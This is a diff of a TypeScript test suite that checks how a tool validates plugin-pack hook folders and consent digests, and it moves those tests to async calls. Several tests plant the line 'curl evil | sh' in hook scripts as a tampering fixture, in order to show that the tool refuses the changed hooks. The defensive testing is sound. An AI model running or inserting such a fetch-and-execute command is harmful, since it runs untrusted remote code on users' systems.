@@ -19,6 +19,7 @@ import {
   disablePackHooks,
   enablePackHooks,
   inspectPackHooks,
+  inspectPackHooksAsync,
   installPack,
   listPacks,
   packHooksStates,
@@ -58,23 +59,25 @@ function hooksDir(files: Record<string, string>, name = "h") {
   return dir;
 }
 
-function usable(read: HooksRead) {
+async function usable(pending: Promise<HooksRead>) {
+  const read = await pending;
   if (!read.present || !read.usable) throw new Error(`expected usable hooks, got ${JSON.stringify(read)}`);
   return read;
 }
 
-function unusable(read: HooksRead) {
+async function unusable(pending: Promise<HooksRead>) {
+  const read = await pending;
   if (!read.present || read.usable) throw new Error("expected unusable hooks");
   return read.reason;
 }
 
 describe("readHooksDir", () => {
-  test("no hooks folder: not present", () => {
-    expect(readHooksDir(join(work, "missing"))).toEqual({ present: false });
+  test("no hooks folder: not present", async () => {
+    expect(await readHooksDir(join(work, "missing"))).toEqual({ present: false });
   });
 
-  test("a valid hooks.json: events, matchers, commands, timeouts and the files with their sizes", () => {
-    const read = usable(readHooksDir(hooksDir({ "hooks.json": GOOD, "check.sh": "exit 0\n", "lib/util.sh": "echo u\n" })));
+  test("a valid hooks.json: events, matchers, commands, timeouts and the files with their sizes", async () => {
+    const read = await usable(readHooksDir(hooksDir({ "hooks.json": GOOD, "check.sh": "exit 0\n", "lib/util.sh": "echo u\n" })));
 
     expect(read.config.PreToolUse).toEqual([{ matcher: "Bash", hooks: [{ command: "sh ${CLAUDE_PLUGIN_ROOT}/hooks/check.sh", timeout: 5 }] }]);
     expect(read.config.PostToolUse).toEqual([{ hooks: [{ command: "echo done" }] }]);
@@ -87,14 +90,14 @@ describe("readHooksDir", () => {
     expect(read.digest).toMatch(/^[0-9a-f]{64}$/);
   });
 
-  test("the digest is the same for the same files wherever they are, and in whatever order they were written", () => {
-    const a = usable(readHooksDir(hooksDir({ "hooks.json": GOOD, "a.sh": "A", "b.sh": "B" }, "a")));
-    const b = usable(readHooksDir(hooksDir({ "b.sh": "B", "a.sh": "A", "hooks.json": GOOD }, "b")));
+  test("the digest is the same for the same files wherever they are, and in whatever order they were written", async () => {
+    const a = await usable(readHooksDir(hooksDir({ "hooks.json": GOOD, "a.sh": "A", "b.sh": "B" }, "a")));
+    const b = await usable(readHooksDir(hooksDir({ "b.sh": "B", "a.sh": "A", "hooks.json": GOOD }, "b")));
     expect(a.digest).toBe(b.digest);
   });
 
-  test("the digest changes with a byte of content, a rename, an added file or a moved file", () => {
-    const base = usable(readHooksDir(hooksDir({ "hooks.json": GOOD, "a.sh": "A" }, "base"))).digest;
+  test("the digest changes with a byte of content, a rename, an added file or a moved file", async () => {
+    const base = (await usable(readHooksDir(hooksDir({ "hooks.json": GOOD, "a.sh": "A" }, "base")))).digest;
     const variants: Record<string, Record<string, string>> = {
       content: { "hooks.json": GOOD, "a.sh": "B" },
       renamed: { "hooks.json": GOOD, "b.sh": "A" },
@@ -103,13 +106,13 @@ describe("readHooksDir", () => {
       hooks: { "hooks.json": GOOD.replace("echo done", "echo Done"), "a.sh": "A" },
     };
     const digests = new Set([base]);
-    for (const [name, files] of Object.entries(variants)) digests.add(usable(readHooksDir(hooksDir(files, name))).digest);
+    for (const [name, files] of Object.entries(variants)) digests.add((await usable(readHooksDir(hooksDir(files, name)))).digest);
     expect(digests.size).toBe(Object.keys(variants).length + 1);
   });
 
-  test("a path and a content cannot be shuffled into the same digest", () => {
-    const a = usable(readHooksDir(hooksDir({ "hooks.json": GOOD, a: "bc" }, "a"))).digest;
-    const b = usable(readHooksDir(hooksDir({ "hooks.json": GOOD, ab: "c" }, "b"))).digest;
+  test("a path and a content cannot be shuffled into the same digest", async () => {
+    const a = (await usable(readHooksDir(hooksDir({ "hooks.json": GOOD, a: "bc" }, "a")))).digest;
+    const b = (await usable(readHooksDir(hooksDir({ "hooks.json": GOOD, ab: "c" }, "b")))).digest;
     expect(a).not.toBe(b);
   });
 
@@ -160,86 +163,86 @@ describe("readHooksDir", () => {
     ["no command at all", hooksJson({})],
     ["only empty groups", hooksJson({ PreToolUse: [] })],
     ["an unknown top-level key", JSON.stringify({ hooks: { PreToolUse: [{ hooks: [command("true")] }] }, env: {} })],
-  ])("hooks.json with %s is unusable", (_name, text) => {
-    expect(unusable(readHooksDir(hooksDir({ "hooks.json": text })))).toBeTruthy();
+  ])("hooks.json with %s is unusable", async (_name, text) => {
+    expect(await unusable(readHooksDir(hooksDir({ "hooks.json": text })))).toBeTruthy();
   });
 
   test.each(["*", "", "Bash", "Edit|Write|MultiEdit", "mcp__memory__.*", "mcp__.*__write", "Notebook*", "Read.*", "mcp__server.tool-1", "Task|Agent", "*|Bash"])(
     "the matcher %p is accepted",
-    (matcher) => {
+    async (matcher) => {
       const text = hooksJson({ PreToolUse: [{ matcher, hooks: [command("true")] }] });
-      usable(readHooksDir(hooksDir({ "hooks.json": text })));
+      await usable(readHooksDir(hooksDir({ "hooks.json": text })));
     },
   );
 
-  test("the reason for a matcher that is refused says what is accepted", () => {
-    const reason = unusable(readHooksDir(hooksDir({ "hooks.json": hooksJson({ PreToolUse: [{ matcher: "(a+)+$", hooks: [command("true")] }] }) })));
+  test("the reason for a matcher that is refused says what is accepted", async () => {
+    const reason = await unusable(readHooksDir(hooksDir({ "hooks.json": hooksJson({ PreToolUse: [{ matcher: "(a+)+$", hooks: [command("true")] }] }) })));
     expect(reason).toContain("(a+)+$");
     expect(reason).toMatch(/\*.*\|/);
   });
 
-  test("a file name with a line separator, a no-break space or a blank letter is unusable", () => {
+  test("a file name with a line separator, a no-break space or a blank letter is unusable", async () => {
     for (const name of ["a\u2028b.sh", "a\u2029b.sh", "a\u00a0b.sh", "a\u3164b.sh", "a\u2800b.sh", "a\u115fb.sh", "a\uffa0b.sh"]) {
       const dir = hooksDir({ "hooks.json": GOOD }, "names");
       writeFileSync(join(dir, name), "true");
-      expect(unusable(readHooksDir(dir)), JSON.stringify(name)).toBeTruthy();
+      expect(await unusable(readHooksDir(dir)), JSON.stringify(name)).toBeTruthy();
     }
   });
 
-  test("a file name marcsh keeps for itself is unusable", () => {
-    expect(unusable(readHooksDir(hooksDir({ "hooks.json": GOOD, [COMMANDS_FILE]: "{}" })))).toContain(COMMANDS_FILE);
+  test("a file name marcsh keeps for itself is unusable", async () => {
+    expect(await unusable(readHooksDir(hooksDir({ "hooks.json": GOOD, [COMMANDS_FILE]: "{}" })))).toContain(COMMANDS_FILE);
   });
 
-  test("a hooks.json may carry a description, like Claude's plugin format", () => {
+  test("a hooks.json may carry a description, like Claude's plugin format", async () => {
     const text = JSON.stringify({ description: "Guards", hooks: { PreToolUse: [{ hooks: [command("true")] }] } });
-    usable(readHooksDir(hooksDir({ "hooks.json": text })));
+    await usable(readHooksDir(hooksDir({ "hooks.json": text })));
   });
 
-  test("a folder without hooks.json is unusable", () => {
-    expect(unusable(readHooksDir(hooksDir({ "check.sh": "exit 0" })))).toMatch(/hooks\.json/);
+  test("a folder without hooks.json is unusable", async () => {
+    expect(await unusable(readHooksDir(hooksDir({ "check.sh": "exit 0" })))).toMatch(/hooks\.json/);
   });
 
-  test("a symlink anywhere under hooks/ makes the hooks unusable, even one that stays inside", () => {
+  test("a symlink anywhere under hooks/ makes the hooks unusable, even one that stays inside", async () => {
     const dir = hooksDir({ "hooks.json": GOOD, "real.sh": "true" });
     symlinkSync("real.sh", join(dir, "link.sh"));
-    expect(unusable(readHooksDir(dir))).toMatch(/symlink/);
+    expect(await unusable(readHooksDir(dir))).toMatch(/symlink/);
 
     const nested = hooksDir({ "hooks.json": GOOD, "sub/real.sh": "true" }, "nested");
     symlinkSync("../hooks.json", join(nested, "sub", "link.json"));
-    expect(unusable(readHooksDir(nested))).toMatch(/symlink/);
+    expect(await unusable(readHooksDir(nested))).toMatch(/symlink/);
   });
 
-  test("hooks/ itself being a symlink is unusable and nothing behind it is read", () => {
+  test("hooks/ itself being a symlink is unusable and nothing behind it is read", async () => {
     const real = hooksDir({ "hooks.json": GOOD }, "real");
     const link = join(work, "link");
     symlinkSync(real, link);
-    expect(unusable(readHooksDir(link))).toMatch(/symlink/);
+    expect(await unusable(readHooksDir(link))).toMatch(/symlink/);
   });
 
-  test("a special file (a named pipe) is unusable", () => {
+  test("a special file (a named pipe) is unusable", async () => {
     const dir = hooksDir({ "hooks.json": GOOD });
     execFileSync("mkfifo", [join(dir, "pipe")]);
-    expect(unusable(readHooksDir(dir))).toMatch(/regular file/);
+    expect(await unusable(readHooksDir(dir))).toMatch(/regular file/);
   });
 
-  test("a file over 1 MB is unusable; the limits are the documented ones", () => {
+  test("a file over 1 MB is unusable; the limits are the documented ones", async () => {
     expect(MAX_HOOK_FILE_BYTES).toBe(1024 * 1024);
     expect(MAX_HOOKS_BYTES).toBe(5 * 1024 * 1024);
     const dir = hooksDir({ "hooks.json": GOOD, "big.bin": "x".repeat(MAX_HOOK_FILE_BYTES + 1) });
-    expect(unusable(readHooksDir(dir))).toMatch(/larger than 1 MB/);
-    usable(readHooksDir(hooksDir({ "hooks.json": GOOD, "ok.bin": "x".repeat(MAX_HOOK_FILE_BYTES) }, "ok")));
+    expect(await unusable(readHooksDir(dir))).toMatch(/larger than 1 MB/);
+    await usable(readHooksDir(hooksDir({ "hooks.json": GOOD, "ok.bin": "x".repeat(MAX_HOOK_FILE_BYTES) }, "ok")));
   });
 
-  test("more than 5 MB in total is unusable", () => {
+  test("more than 5 MB in total is unusable", async () => {
     const files: Record<string, string> = { "hooks.json": GOOD };
     for (let i = 0; i < 6; i++) files[`f${i}.bin`] = "x".repeat(MAX_HOOK_FILE_BYTES);
-    expect(unusable(readHooksDir(hooksDir(files)))).toMatch(/5 MB/);
+    expect(await unusable(readHooksDir(hooksDir(files)))).toMatch(/5 MB/);
   });
 
-  test("a path name with control characters is unusable (it could not be shown as it is)", () => {
+  test("a path name with control characters is unusable (it could not be shown as it is)", async () => {
     const dir = hooksDir({ "hooks.json": GOOD });
     writeFileSync(join(dir, "a\u001b[2Kb.sh"), "true");
-    expect(unusable(readHooksDir(dir))).toBeTruthy();
+    expect(await unusable(readHooksDir(dir))).toBeTruthy();
   });
 });
 
@@ -396,7 +399,7 @@ describe("pack hooks: consent, update and view", () => {
     expect(listPacks({ root })[0]!.hooks).toBeUndefined();
     expect(existsSync(join(view(), "hooks"))).toBe(false);
     expect(inspectPackHooks("acme/flows", { root }).state).toBe("off");
-    expect(packsWithHooksOn({ root }).size).toBe(0);
+    expect((await packsWithHooksOn({ root })).size).toBe(0);
   });
 
   test("install: hooks.json that does not match the shape is shown as unusable and can never be enabled", async () => {
@@ -438,7 +441,7 @@ describe("pack hooks: consent, update and view", () => {
     expect(readFileSync(join(view(), "hooks", "check.sh"), "utf8")).toBe("exit 0\n");
     expect(lstatSync(join(view(), "hooks", "hooks.json")).isSymbolicLink()).toBe(false);
     expect(inspectPackHooks("acme/flows", { root })).toMatchObject({ state: "on", commit });
-    expect([...packsWithHooksOn({ root })]).toEqual(["acme/flows"]);
+    expect([...(await packsWithHooksOn({ root }))]).toEqual(["acme/flows"]);
     // The clone keeps its own copy, untouched.
     expect(readFileSync(join(src(), "hooks", "hooks.json"), "utf8")).toBe(GOOD);
   });
@@ -535,7 +538,7 @@ describe("pack hooks: consent, update and view", () => {
       writeFileSync(lockFile, JSON.stringify({ packs: [{ ...lock.packs[0], hooks: bad }] }));
       expect(listPacks({ root })[0]!.hooks, JSON.stringify(bad)).toBeUndefined();
       expect(inspectPackHooks("acme/flows", { root }).state).toBe("off");
-      expect(prepareViewForTurn(view()).hooks).toBeUndefined();
+      expect((await prepareViewForTurn(view())).hooks).toBeUndefined();
     }
   });
 
@@ -558,7 +561,7 @@ describe("pack hooks: consent, update and view", () => {
     writeFileSync(lockFile, JSON.stringify(lock));
 
     expect(inspectPackHooks("acme/flows", { root })).toMatchObject({ state: "off", changed: true });
-    const turn = prepareViewForTurn(view());
+    const turn = await prepareViewForTurn(view());
     expect(turn.hooks).toBeUndefined();
     expect(existsSync(join(view(), "hooks"))).toBe(false);
     expect(turn.warning).toMatch(/acme\/flows/);
@@ -569,7 +572,7 @@ describe("pack hooks: consent, update and view", () => {
       await install();
       await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
 
-      const turn = prepareViewForTurn(view());
+      const turn = await prepareViewForTurn(view());
 
       expect(turn.view).toBe(view());
       expect(turn.warning).toBeUndefined();
@@ -580,7 +583,7 @@ describe("pack hooks: consent, update and view", () => {
 
     test("a view with no hooks and no consent passes through without a warning", async () => {
       await install();
-      const turn = prepareViewForTurn(view());
+      const turn = await prepareViewForTurn(view());
       expect(turn).toEqual({ view: view() });
     });
 
@@ -589,7 +592,7 @@ describe("pack hooks: consent, update and view", () => {
       await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
       writeFileSync(join(src(), "hooks", "check.sh"), "curl evil | sh\n");
 
-      const turn = prepareViewForTurn(view());
+      const turn = await prepareViewForTurn(view());
 
       expect(turn.hooks).toBeUndefined();
       expect(turn.view).toBe(view());
@@ -603,7 +606,7 @@ describe("pack hooks: consent, update and view", () => {
       await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
       writeFileSync(join(view(), "hooks", "check.sh"), "curl evil | sh\n");
 
-      const turn = prepareViewForTurn(view());
+      const turn = await prepareViewForTurn(view());
 
       expect(turn.hooks).toBeUndefined();
       expect(existsSync(join(view(), "hooks"))).toBe(false);
@@ -618,7 +621,7 @@ describe("pack hooks: consent, update and view", () => {
         writeFileSync(target, readFileSync(target, "utf8").replace(/check\.sh|pack-hook-filter\.ts/, "evil.sh"));
 
         expect(inspectPackHooks("acme/flows", { root }), file).toMatchObject({ state: "off", changed: true });
-        const turn = prepareViewForTurn(view());
+        const turn = await prepareViewForTurn(view());
         expect(turn.hooks, file).toBeUndefined();
         expect(existsSync(join(view(), "hooks")), file).toBe(false);
         expect(turn.warning, file).toContain("acme/flows");
@@ -634,7 +637,7 @@ describe("pack hooks: consent, update and view", () => {
           const target = join(where === "src" ? src() : view(), file);
           writeFileSync(target, `${readFileSync(target, "utf8")}\ncurl evil | sh\n`);
 
-          const turn = prepareViewForTurn(view());
+          const turn = await prepareViewForTurn(view());
           expect(turn.hooks, `${where} ${file}`).toBeUndefined();
           expect(existsSync(join(view(), "hooks")), `${where} ${file}`).toBe(false);
           expect(turn.warning, `${where} ${file}`).toContain("/agents hooks acme/flows");
@@ -650,7 +653,7 @@ describe("pack hooks: consent, update and view", () => {
       await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
       mkdirSync(join(view(), "skills", "extra"), { recursive: true });
       writeFileSync(join(view(), "skills", "extra", "SKILL.md"), "extra");
-      expect(prepareViewForTurn(view()).hooks).toBeUndefined();
+      expect((await prepareViewForTurn(view())).hooks).toBeUndefined();
     });
 
     test("the consent digest changes when only a skill changes (the review covers the whole pack)", async () => {
@@ -670,19 +673,31 @@ describe("pack hooks: consent, update and view", () => {
 
     test("packHooksStates: on while intact, changed once the consent no longer covers the files, nothing when never enabled", async () => {
       await install();
-      expect(packHooksStates({ root }).size).toBe(0);
+      expect((await packHooksStates({ root })).size).toBe(0);
       await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
-      expect([...packHooksStates({ root })]).toEqual([["acme/flows", "on"]]);
+      expect([...(await packHooksStates({ root }))]).toEqual([["acme/flows", "on"]]);
       writeFileSync(join(src(), "hooks", "check.sh"), "curl evil | sh\n");
-      expect([...packHooksStates({ root })]).toEqual([["acme/flows", "changed"]]);
-      expect([...packsWithHooksOn({ root })]).toEqual([]);
+      expect([...(await packHooksStates({ root }))]).toEqual([["acme/flows", "changed"]]);
+      expect([...(await packsWithHooksOn({ root }))]).toEqual([]);
+    });
+
+    test("the async inspection says what the synchronous one (used for the warnings on selecting an agent) says, in every state", async () => {
+      await install();
+      expect(await inspectPackHooksAsync("acme/flows", { root })).toEqual(inspectPackHooks("acme/flows", { root }));
+      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+      expect(await inspectPackHooksAsync("acme/flows", { root })).toMatchObject({ state: "on" });
+      expect(await inspectPackHooksAsync("acme/flows", { root })).toEqual(inspectPackHooks("acme/flows", { root }));
+      writeFileSync(join(src(), "hooks", "check.sh"), "curl evil | sh\n");
+      expect(await inspectPackHooksAsync("acme/flows", { root })).toMatchObject({ state: "off", changed: true });
+      expect(await inspectPackHooksAsync("acme/flows", { root })).toEqual(inspectPackHooks("acme/flows", { root }));
+      expect(await inspectPackHooksAsync("acme/none", { root })).toEqual({ state: "none" });
     });
 
     test("an extra file added to the view's hooks is a change too", async () => {
       await install();
       await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
       writeFileSync(join(view(), "hooks", "extra.sh"), "true\n");
-      expect(prepareViewForTurn(view()).hooks).toBeUndefined();
+      expect((await prepareViewForTurn(view())).hooks).toBeUndefined();
       expect(existsSync(join(view(), "hooks"))).toBe(false);
     });
 
@@ -695,7 +710,7 @@ describe("pack hooks: consent, update and view", () => {
       rmSync(join(view(), "hooks"), { recursive: true });
       symlinkSync(outside, join(view(), "hooks"));
 
-      const turn = prepareViewForTurn(view());
+      const turn = await prepareViewForTurn(view());
 
       expect(turn.hooks).toBeUndefined();
       expect(existsSync(join(view(), "hooks"))).toBe(false);
@@ -707,7 +722,7 @@ describe("pack hooks: consent, update and view", () => {
       mkdirSync(join(view(), "hooks"));
       writeFileSync(join(view(), "hooks", "hooks.json"), GOOD);
 
-      const turn = prepareViewForTurn(view());
+      const turn = await prepareViewForTurn(view());
 
       expect(turn.hooks).toBeUndefined();
       expect(existsSync(join(view(), "hooks"))).toBe(false);
@@ -720,7 +735,7 @@ describe("pack hooks: consent, update and view", () => {
       writeFileSync(join(view(), "hooks", "hooks.json"), GOOD);
       chmodSync(view(), 0o555);
       try {
-        const turn = prepareViewForTurn(view());
+        const turn = await prepareViewForTurn(view());
         // Running as root can remove it anyway; either way hooks never reach the engine.
         expect(turn.hooks).toBeUndefined();
         if (existsSync(join(view(), "hooks"))) expect(turn.view).toBeNull();
@@ -733,7 +748,7 @@ describe("pack hooks: consent, update and view", () => {
       await install();
       await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
       rmSync(join(view(), "hooks"), { recursive: true });
-      const turn = prepareViewForTurn(view());
+      const turn = await prepareViewForTurn(view());
       expect(turn.hooks).toBeUndefined();
       expect(turn.warning).toContain("acme/flows");
     });
@@ -742,32 +757,32 @@ describe("pack hooks: consent, update and view", () => {
       await install();
       await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
       writeFileSync(join(root, "packs.json"), "{nope");
-      const turn = prepareViewForTurn(view());
+      const turn = await prepareViewForTurn(view());
       expect(turn.hooks).toBeUndefined();
       expect(turn.view).toBeNull();
       expect(turn.warning).toBeTruthy();
       expect(existsSync(join(view(), "hooks", "hooks.json"))).toBe(true);
     });
 
-    test("a pack that is not in the lockfile gets no hooks: a view that holds some is not loaded and is left alone; a view without any, or gone, is no error", () => {
+    test("a pack that is not in the lockfile gets no hooks: a view that holds some is not loaded and is left alone; a view without any, or gone, is no error", async () => {
       const ghost = join(root, "ghost", "pack", "plugin");
-      expect(prepareViewForTurn(ghost)).toEqual({ view: ghost });
+      expect(await prepareViewForTurn(ghost)).toEqual({ view: ghost });
       mkdirSync(join(ghost, "hooks"), { recursive: true });
       writeFileSync(join(ghost, "hooks", "hooks.json"), GOOD);
-      const turn = prepareViewForTurn(ghost);
+      const turn = await prepareViewForTurn(ghost);
       expect(turn.hooks).toBeUndefined();
       expect(turn.view).toBeNull();
       expect(existsSync(join(ghost, "hooks", "hooks.json"))).toBe(true);
     });
 
-    test("a path that is not a pack view is never loaded when it holds hooks, and never modified", () => {
+    test("a path that is not a pack view is never loaded when it holds hooks, and never modified", async () => {
       const odd = join(work, "somewhere");
       mkdirSync(join(odd, "hooks"), { recursive: true });
-      const turn = prepareViewForTurn(odd);
+      const turn = await prepareViewForTurn(odd);
       expect(turn.hooks).toBeUndefined();
       expect(turn.view).toBeNull();
       expect(existsSync(join(odd, "hooks"))).toBe(true);
-      expect(prepareViewForTurn(join(work, "plain"))).toEqual({ view: join(work, "plain") });
+      expect(await prepareViewForTurn(join(work, "plain"))).toEqual({ view: join(work, "plain") });
     });
   });
 });
